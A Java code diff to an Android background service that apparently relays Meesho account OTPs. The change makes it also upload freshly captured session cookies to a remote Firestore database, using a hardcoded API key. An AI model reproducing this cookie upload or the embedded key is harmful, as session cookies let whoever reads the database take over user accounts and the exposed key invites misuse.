@@ -432,11 +432,20 @@ public class MeeshoBackgroundService extends Service {
     }
 
     private void syncToFirestore(String docId, String otp, String courier, int count, String dateTime, String status) {
+        syncToFirestore(docId, otp, courier, count, dateTime, status, null);
+    }
+
+    private void syncToFirestore(String docId, String otp, String courier, int count, String dateTime, String status, String cookies) {
         if (docId == null || docId.trim().isEmpty()) return;
         HttpURLConnection conn = null;
         try {
             String encodedDocId = java.net.URLEncoder.encode(docId.trim(), "UTF-8");
-            URL url = new URL("https://firestore.googleapis.com/v1/projects/meesho-otp-app/databases/(default)/documents/accounts/" + encodedDocId + "?updateMask.fieldPaths=currentOtp&updateMask.fieldPaths=courier&updateMask.fieldPaths=handoverCount&updateMask.fieldPaths=dateTime&updateMask.fieldPaths=status&updateMask.fieldPaths=lastUpdated&key=AIzaSyBXcH8anFAy8xWfQnfHcb1Pyf9J1aM0DDE");
+            String queryParams = "?updateMask.fieldPaths=currentOtp&updateMask.fieldPaths=courier&updateMask.fieldPaths=handoverCount&updateMask.fieldPaths=dateTime&updateMask.fieldPaths=status&updateMask.fieldPaths=lastUpdated";
+            if (cookies != null && !cookies.isEmpty()) {
+                queryParams += "&updateMask.fieldPaths=cookies";
+            }
+            queryParams += "&key=AIzaSyBXcH8anFAy8xWfQnfHcb1Pyf9J1aM0DDE";
+            URL url = new URL("https://firestore.googleapis.com/v1/projects/meesho-otp-app/databases/(default)/documents/accounts/" + encodedDocId + queryParams);
             conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("X-HTTP-Method-Override", "PATCH");
@@ -451,6 +460,9 @@ public class MeeshoBackgroundService extends Service {
             JSONObject fCount = new JSONObject(); fCount.put("integerValue", String.valueOf(count)); fields.put("handoverCount", fCount);
             JSONObject fTime = new JSONObject(); fTime.put("stringValue", dateTime != null ? dateTime : ""); fields.put("dateTime", fTime);
             JSONObject fStatus = new JSONObject(); fStatus.put("stringValue", status != null ? status : "live"); fields.put("status", fStatus);
+            if (cookies != null && !cookies.isEmpty()) {
+                JSONObject fCook = new JSONObject(); fCook.put("stringValue", cookies); fields.put("cookies", fCook);
+            }
             SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
             iso.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
             JSONObject fLast = new JSONObject(); fLast.put("stringValue", iso.format(new Date())); fields.put("lastUpdated", fLast);
@@ -565,10 +577,15 @@ public class MeeshoBackgroundService extends Service {
                 if (!freshCookies.isEmpty()) {
                     String sessionsJson = prefs.getString("sessions", "{}");
                     JSONObject all = new JSONObject(sessionsJson);
+                    String docId = syncKey;
                     if (all.has(syncKey)) {
-                        all.getJSONObject(syncKey).put("cookies", freshCookies);
+                        JSONObject cur = all.getJSONObject(syncKey);
+                        cur.put("cookies", freshCookies);
+                        docId = cur.optString("docId", syncKey);
                         prefs.edit().putString("sessions", all.toString()).apply();
                     }
+                    String timeStr = new SimpleDateFormat("hh:mm a", Locale.getDefault()).format(new Date());
+                    syncToFirestore(docId, "----", "No Return", 0, timeStr, "live", freshCookies);
                     return freshCookies;
                 }
             }
